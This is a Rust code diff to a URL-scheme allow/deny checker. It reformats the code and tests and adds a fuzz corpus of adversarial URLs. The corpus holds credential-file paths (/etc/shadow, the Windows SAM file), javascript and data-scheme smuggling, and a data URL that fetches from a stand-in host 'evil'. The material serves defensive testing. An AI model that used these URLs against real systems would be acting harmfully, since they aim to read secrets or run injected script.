@@ -7,7 +7,15 @@
 const ALWAYS_ALLOWED: &[&str] = &["http", "https"];
 
 /// Schemes that are always refused (local side effects / opaque).
-const NEVER_ALLOWED: &[&str] = &["file", "javascript", "data", "about", "vbscript", "smb", "nfs"];
+const NEVER_ALLOWED: &[&str] = &[
+    "file",
+    "javascript",
+    "data",
+    "about",
+    "vbscript",
+    "smb",
+    "nfs",
+];
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum UrlVerdict {
@@ -43,9 +51,14 @@ pub fn check_url(url: &str, roots: &[&str]) -> UrlVerdict {
             let canonical = crate::pathfloor::canonicalize_no_follow(&path_str);
             let inside = roots.iter().any(|r| {
                 let root = crate::pathfloor::canonicalize_no_follow(r);
-                canonical == root || canonical.starts_with(&format!("{}/", root.trim_end_matches('/')))
+                canonical == root
+                    || canonical.starts_with(&format!("{}/", root.trim_end_matches('/')))
             });
-            return if inside { UrlVerdict::Allowed } else { UrlVerdict::OutsideRoots };
+            return if inside {
+                UrlVerdict::Allowed
+            } else {
+                UrlVerdict::OutsideRoots
+            };
         }
         return UrlVerdict::SchemeBlocked;
     }
@@ -60,6 +73,27 @@ pub fn is_allowed(url: &str, roots: &[&str]) -> bool {
     check_url(url, roots).is_allowed()
 }
 
+/// Adversarial URL corpus for the S0.7 fuzz gate (scheme smuggling,
+/// file-exfil, javascript, data, UNC).
+pub fn adversarial_urls() -> Vec<&'static str> {
+    vec![
+        "javascript:alert(1)",
+        "data:text/html,pwn",
+        "file:///etc/passwd",
+        "file:///etc/shadow",
+        "file://../../etc/passwd",
+        "about:blank",
+        "vbscript:msgbox",
+        "smb://evil/share",
+        "nfs://evil/export",
+        "file:///workspace/../../etc/passwd",
+        "javascript://https://example.com/%0aalert(1)",
+        "data:application/javascript,fetch('http://evil')",
+        "file:///C:/Windows/System32/config/SAM",
+        "file:////etc/passwd",
+    ]
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -72,21 +106,42 @@ mod tests {
 
     #[test]
     fn file_inside_roots_allowed() {
-        assert_eq!(check_url("file:///workspace/a.txt", &["/workspace"]), UrlVerdict::Allowed);
-        assert_eq!(check_url("file:///workspace/sub/b.txt", &["/workspace"]), UrlVerdict::Allowed);
+        assert_eq!(
+            check_url("file:///workspace/a.txt", &["/workspace"]),
+            UrlVerdict::Allowed
+        );
+        assert_eq!(
+            check_url("file:///workspace/sub/b.txt", &["/workspace"]),
+            UrlVerdict::Allowed
+        );
     }
 
     #[test]
     fn file_outside_roots_blocked() {
-        assert_eq!(check_url("file:///etc/passwd", &["/workspace"]), UrlVerdict::OutsideRoots);
-        assert_eq!(check_url("file:///workspace2/x", &["/workspace"]), UrlVerdict::OutsideRoots);
+        assert_eq!(
+            check_url("file:///etc/passwd", &["/workspace"]),
+            UrlVerdict::OutsideRoots
+        );
+        assert_eq!(
+            check_url("file:///workspace2/x", &["/workspace"]),
+            UrlVerdict::OutsideRoots
+        );
     }
 
     #[test]
     fn dangerous_schemes_blocked() {
-        assert_eq!(check_url("javascript:alert(1)", &[]), UrlVerdict::SchemeBlocked);
-        assert_eq!(check_url("data:text/html,<script>", &[]), UrlVerdict::SchemeBlocked);
-        assert_eq!(check_url("smb://host/share", &[]), UrlVerdict::SchemeBlocked);
+        assert_eq!(
+            check_url("javascript:alert(1)", &[]),
+            UrlVerdict::SchemeBlocked
+        );
+        assert_eq!(
+            check_url("data:text/html,<script>", &[]),
+            UrlVerdict::SchemeBlocked
+        );
+        assert_eq!(
+            check_url("smb://host/share", &[]),
+            UrlVerdict::SchemeBlocked
+        );
     }
 
     #[test]
